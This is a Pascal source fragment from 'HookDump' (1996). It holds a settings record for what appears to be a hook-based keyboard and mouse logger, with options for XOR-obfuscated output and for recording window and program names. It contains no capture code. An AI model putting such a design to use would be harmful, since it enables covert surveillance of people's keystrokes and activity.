Const Version = 2*256+08;

{$D (C),96 iLya Osipov -=HookDump=- ilya000@usa.net}

type TSt = record
  XorOutput,
  UseBuffer,
  AnsiToOem,
  UseMouse,
  ExeName,
  WndName,
  WriteBasic,
  WritePush,
  WritePop:Boolean;
  XorBase:Byte;
  BufSize:Word;
  WndExeTime:Boolean;
end;

const St: TSt = (
  XorOutput:true;
  UseBuffer:true;
  AnsiToOem:true;
  UseMouse:True;
  ExeName:True;
  WndName:True;
  WriteBasic:True;
  WritePush:true;
  WritePop:true;
  XorBase:$AA;
  BufSize:2500;
  WndExeTime:True);
